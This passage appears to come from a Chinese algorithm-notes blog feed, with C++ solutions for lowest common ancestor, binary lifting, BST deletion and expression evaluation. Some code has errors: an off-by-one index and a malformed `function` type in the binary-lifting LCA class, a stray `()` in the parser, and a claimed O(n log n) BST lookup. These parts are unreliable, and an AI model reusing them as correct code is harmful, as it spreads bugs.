= root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lson||rson||(root == p || root == q);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode *<span class="title">lowestCommonAncestor</span><span class="params">(TreeNode *root, TreeNode *p, TreeNode *q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span> || root == p || root == q)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        TreeNode *left = <span class="built_in">lowestCommonAncestor</span>(root-&gt;left, p, q);</span><br><span class="line">        TreeNode *right = <span class="built_in">lowestCommonAncestor</span>(root-&gt;right, p, q);</span><br><span class="line">        <span class="keyword">if</span> (left &amp;&amp; right)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">return</span> left ? left : right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>方法四  哈希表，记录节点父节点</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>,TreeNode*&gt; fa;        <span class="comment">//记录节点的父节点</span></span><br><span class="line">    unordered_set&lt;TreeNode*&gt; visited;       </span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        fa[root-&gt;val]=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">DFS</span>(root);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            visited.<span class="built_in">insert</span>(p);</span><br><span class="line">            p=fa[p-&gt;val];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(q!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited.<span class="built_in">count</span>(q))</span><br><span class="line">                <span class="keyword">return</span> q;</span><br><span class="line">            q=fa[q-&gt;val];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">DFS</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            fa[root-&gt;left-&gt;val]=root;</span><br><span class="line">            <span class="built_in">DFS</span>(root-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            fa[root-&gt;right-&gt;val]=root;</span><br><span class="line">            <span class="built_in">DFS</span>(root-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>树上倍增</h1>
<p><a href="https://leetcode.cn/problems/kth-ancestor-of-a-tree-node/description/">1483. 树节点的第 K 个祖先</a><br>
$$<br>
dp[i][j]表示节点i的第2<sup>j个祖先节点，即从节点i跳2</sup>j步到达的节点\<br>
dp[i][j]=dp [\textbf{ dp[i][j-1] } ] [j-1]<br>
$$</p>
<blockquote>
<p>求节点node的第k个节点：<br>
$k=13=(1101)_2$，可以先往上跳 8步，再往上跳 4步和 1 步；也可以先往上跳 1 步，再往上跳 4 步和 8步。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeAncestor</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dp;</span><br><span class="line">    <span class="built_in">TreeAncestor</span>(<span class="type">int</span> n, vector&lt;<span class="type">int</span>&gt;&amp; parent) &#123;</span><br><span class="line">        <span class="type">int</span> m=<span class="number">32</span>-__builtin_clz(n);<span class="comment">//n的二进制长度</span></span><br><span class="line">        <span class="comment">// dp[i][j]表示i节点的2**j个祖先</span></span><br><span class="line">        dp.<span class="built_in">resize</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m,<span class="number">-1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>]=parent[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> x=<span class="number">0</span>;x&lt;n;x++)&#123;</span><br><span class="line">                <span class="type">int</span> p=dp[x][i<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">if</span>(p!=<span class="number">-1</span>)</span><br><span class="line">                    dp[x][i]=dp[p][i<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getKthAncestor</span><span class="params">(<span class="type">int</span> node, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m=<span class="number">32</span>-__builtin_clz(k);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>((k&gt;&gt;i)&amp;<span class="number">1</span>)&#123;</span><br><span class="line">                node=dp[node][i];</span><br><span class="line">                <span class="keyword">if</span>(node&lt;<span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">return</span> node;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>最近公共祖先（LCA）：通过树上倍增求</h1>
<p><a href="https://leetcode.cn/problems/kth-ancestor-of-a-tree-node/solutions/2305895/mo-ban-jiang-jie-shu-shang-bei-zeng-suan-v3rw/">1483. 树节点的第 K 个祖先 - 力扣（LeetCode）</a></p>
<blockquote>
<p>首先使a和b处于同一深度</p>
<ul class="lvl-1">
<li class="lvl-2">若跳$2^i$步后，x==y(a和b的LCA和以上节点都相同)，则LCA为当前节点或者下面节点，不跳</li>
<li class="lvl-2">若跳$2^i$步后，x!=y，则说明还未到达最近祖先节点，进行跳操作</li>
</ul>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeAncestor</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 无向无环图，有n-1条边</span></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; pa;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; depth;</span><br><span class="line">    <span class="built_in">TreeAncestor</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;edges) &#123;</span><br><span class="line">        <span class="type">int</span> n = edges.<span class="built_in">size</span>() + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> m = <span class="number">32</span> - __builtin_clz(n);	<span class="comment">//n的二进制长度</span></span><br><span class="line">        pa.<span class="built_in">resize</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m, <span class="number">-1</span>));</span><br><span class="line">        depth.<span class="built_in">resize</span>(n);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据边建图</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">g</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [x, y] : edges) &#123;</span><br><span class="line">            g[x].<span class="built_in">push_back</span>(y);</span><br><span class="line">            g[y].<span class="built_in">push_back</span>(x);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// dfs遍历树，求每一个节点对应的深度</span></span><br><span class="line">        function&lt;<span class="type">void</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; dfs = [&amp;](<span class="type">int</span> x, <span class="type">int</span> fa) &#123;</span><br><span class="line">            pa[x][<span class="number">0</span>] = fa;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> y : g[x]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (y != fa) &#123;</span><br><span class="line">                    depth[y] = depth[x] + <span class="number">1</span>;</span><br><span class="line">                    <span class="built_in">dfs</span>(y, x);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">dfs</span>(<span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 倍增算法</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x &lt; n; x++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="type">int</span> p = pa[x][i - <span class="number">1</span>]; p != <span class="number">-1</span>)</span><br><span class="line">                    pa[x][i + <span class="number">1</span>] = pa[p][i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// node节点向上跳k步到达的节点</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getKthAncestor</span><span class="params">(<span class="type">int</span> node, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = <span class="number">32</span> - __builtin_clz(k);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((k &gt;&gt; i) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                node = pa[node][i];</span><br><span class="line">                <span class="keyword">if</span> (node &lt; <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">get_kth_ancestor</span><span class="params">(<span class="type">int</span> node, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (; k; k &amp;= k - <span class="number">1</span>)</span><br><span class="line">            node = pa[node][__builtin_ctz(k)];</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回x和y的最近公共祖先（节点编号从0开始）</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">get_lca</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (depth[x] &gt; depth[y])</span><br><span class="line">            <span class="built_in">swap</span>(x, y);</span><br><span class="line">        <span class="comment">// 使y和x处于同一深度</span></span><br><span class="line">        y = <span class="built_in">getKthAncestor</span>(y, depth[y] - depth[x]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (y == x)</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = pa[x].<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">int</span> px = pa[x][i], py = pa[y][i];</span><br><span class="line">            <span class="keyword">if</span> (px != py) &#123;</span><br><span class="line">                x = px;</span><br><span class="line">                y = py;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pa[x][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>OptimalBST（最优搜索二叉树）</h1>
<blockquote>
<p>二叉查找树(Binary Search Tree,BST) 是一种特殊的二叉树：对于每个父节点，其左子节点的值小于等于父节点的值，其右子节点的值大于等于父节点的值。可以在$O(nlogn)$的时间内查找一个值是否存在。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BST</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TreeNode</span> &#123;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        TreeNode *left, *right;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">      <span class="keyword">public</span>:</span><br><span class="line">        <span class="function">TreeNode *<span class="title">deleteNode</span><span class="params">(TreeNode *root, <span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (root-&gt;val &lt; key) &#123;</span><br><span class="line">                root-&gt;right = <span class="built_in">deleteNode</span>(root-&gt;right, key);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;val &gt; key) &#123;</span><br><span class="line">                root-&gt;left = <span class="built_in">deleteNode</span>(root-&gt;left, key);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 没有右子树</span></span><br><span class="line">                <span class="keyword">if</span> (root-&gt;right == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> root-&gt;left;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 没有左子树</span></span><br><span class="line">                <span class="keyword">if</span> (root-&gt;left == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> root-&gt;right;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 存在左右子树，寻找左子树的最大节点</span></span><br><span class="line">                TreeNode *successor = root-&gt;left;</span><br><span class="line">                <span class="keyword">while</span> (successor-&gt;right) &#123;</span><br><span class="line">                    successor = successor-&gt;right;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 从root中删除successor节点</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 保留源节点</span></span><br><span class="line">                <span class="comment">//  root-&gt;left = deleteNode(root-&gt;left, successor-&gt;val);</span></span><br><span class="line">                <span class="comment">//  successor-&gt;left = root-&gt;left;</span></span><br><span class="line">                <span class="comment">//  successor-&gt;right = root-&gt;right;</span></span><br><span class="line">                <span class="comment">//  return successor;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 复制原节点值</span></span><br><span class="line">                root-&gt;val = successor-&gt;val;</span><br><span class="line">                root-&gt;left = <span class="built_in">deleteNode</span>(root-&gt;left, root-&gt;val);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><a href="https://leetcode.cn/problems/delete-node-in-a-bst/solution/shan-chu-er-cha-sou-suo-shu-zhong-de-jie-n6vo/">删除二叉搜索树中的节点 - 删除二叉搜索树中的节点 - 力扣（LeetCode）</a></p>
<blockquote>
<ul class="lvl-1">
<li class="lvl-3">
<p>root为空，未找到值为key的节点</p>
</li>
<li class="lvl-2">
<p>root-&gt;val&gt;key，继续在左子树中寻找</p>
</li>
<li class="lvl-2">
<p>root-&gt;val&lt; key，继续在右子树中寻找</p>
</li>
<li class="lvl-2">
<p>root-&gt;val == key ，root为要删除的节点</p>
<ul class="lvl-3">
<li class="lvl-4">root为叶节点后者只有左右子树中的一个</li>
<li class="lvl-4">root有左右子树，在左子树中寻找前驱节点（在右子树中寻找后继节点），从左子树中删除前驱节点，用前驱节点替换root节点</li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202309161010301.png" alt="leetcode图解-删除二叉树节点.png"></p>
]]></content>
  </entry>
  <entry>
    <title>栈</title>
    <url>/2023/02/28/%E7%AE%97%E6%B3%95/%E6%A0%88%E3%80%81%E5%8D%95%E8%B0%83%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h1>栈</h1>
<h2 id="应用">应用</h2>
<h3 id="表达式求值">表达式求值</h3>
<h4 id="1-栈实现表达式求值">1. 栈实现表达式求值</h4>
<blockquote>
<p>如果当前运算符优先级小于等于op栈顶的运算符，则弹出两个操作数和操作符进行运算</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//获取运算符优先级</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_priority</span><span class="params">(<span class="type">char</span> op)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//取两个操作数，一个运算符，进行运算</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">operation</span><span class="params">(stack&lt;<span class="type">int</span>&gt; &amp;operand, stack&lt;<span class="type">char</span>&gt; &amp;op)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> operand2 = operand.<span class="built_in">top</span>();</span><br><span class="line">    operand.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="type">int</span> operand1 = operand.<span class="built_in">top</span>();</span><br><span class="line">    operand.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="type">char</span> t = op.<span class="built_in">top</span>();</span><br><span class="line">    op.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; operand1 &lt;&lt; t &lt;&lt; operand2 &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">switch</span> (t) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        operand.<span class="built_in">push</span>(operand1 + operand2);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        operand.<span class="built_in">push</span>(operand1 - operand2);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        operand.<span class="built_in">push</span>(operand1 * operand2);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">        operand.<span class="built_in">push</span>(operand1 / operand2);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string line;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; operand; <span class="comment">//操作数</span></span><br><span class="line">    stack&lt;<span class="type">char</span>&gt; op;     <span class="comment">//操作符</span></span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">getline</span>(cin, line)) &#123;</span><br><span class="line">        cout &lt;&lt; line &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; line.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="comment">// cout &lt;&lt; line[i] &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">if</span> (line[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; line[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (line[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; line[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                    num = num * <span class="number">10</span> + line[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                --i;</span><br><span class="line">                operand.<span class="built_in">push</span>(num);</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;push num:&quot;</span> &lt;&lt; num &lt;&lt; endl;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// cout &lt;&lt; line[i] &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">if</span> (line[i] == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (op.<span class="built_in">top</span>() != <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">operation</span>(operand, op);</span><br><span class="line">                &#125;</span><br><span class="line">                op.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!op.<span class="built_in">empty</span>() &amp;&amp;</span><br><span class="line">                <span class="built_in">get_priority</span>(line[i]) &lt;= <span class="built_in">get_priority</span>(op.<span class="built_in">top</span>())) &#123;</span><br><span class="line">                <span class="built_in">operation</span>(operand, op);</span><br><span class="line">            &#125;</span><br><span class="line">            op.<span class="built_in">push</span>(line[i]);</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;push op:&quot;</span> &lt;&lt; line[i] &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!op.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="built_in">operation</span>(operand, op);</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; op.<span class="built_in">empty</span>() &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; operand.<span class="built_in">top</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-递归下降">2. 递归下降</h4>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202305151152281.png" alt="abc"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">enum</span> &#123; Num &#125;;</span><br><span class="line"><span class="type">char</span> *src = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> token;</span><br><span class="line"><span class="type">int</span> token_val;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">expr</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">match</span><span class="params">(<span class="type">int</span> tk)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">next</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">factor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> value = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (token == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">match</span>(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">        value = <span class="built_in">expr</span>();</span><br><span class="line">        <span class="built_in">match</span>(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        value = token_val;</span><br><span class="line">        () <span class="built_in">printf</span>(<span class="string">&quot;factor value;%d\n&quot;</span>, value);</span><br><span class="line">        <span class="built_in">match</span>(Num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">term_tail</span><span class="params">(<span class="type">int</span> lvalue)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (token == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">match</span>(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">        <span class="type">int</span> value = lvalue * <span class="built_in">factor</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">term_tail</span>(value);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (token == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">match</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="type">int</span> value = lvalue / <span class="built_in">factor</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">term_tail</span>(value);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> lvalue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">term</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> lvalue = <span class="built_in">factor</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">term_tail</span>(lvalue);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">expr_tail</span><span class="params">(<span class="type">int</span> lvalue)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (token == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">match</span>(<span class="string">&#x27;+&#x27;</span>);</span><br><span class="line">        <span class="type">int</span> value = lvalue + <span class="built_in">term</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">expr_tail</span>(value);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (token == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">match</span>(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">        <span class="type">int</span> value = lvalue - <span class="built_in">term</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">expr_tail</span>(value);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> lvalue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">expr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> lvalue = <span class="built_in">term</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">expr_tail</span>(lvalue);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">match</span><span class="params">(<span class="type">int</span> tk)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (token != tk) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;excepted token: %d(%c), got %d(%c)\n&quot;</span>, tk, tk, token, token);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">next</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (*src == <span class="string">&#x27; &#x27;</span> || *src == <span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        src++;</span><br><span class="line">    <span class="comment">//读取token，如果是数字，则将其完整读入</span></span><br><span class="line">    token = *src++;</span><br><span class="line">    <span class="keyword">if</span> (token &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; token &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        token_val = token - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        token = Num;</span><br><span class="line">        <span class="keyword">while</span> (*src &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; *src &lt;= <span class="string">&#x27;9&#x27;</span>) 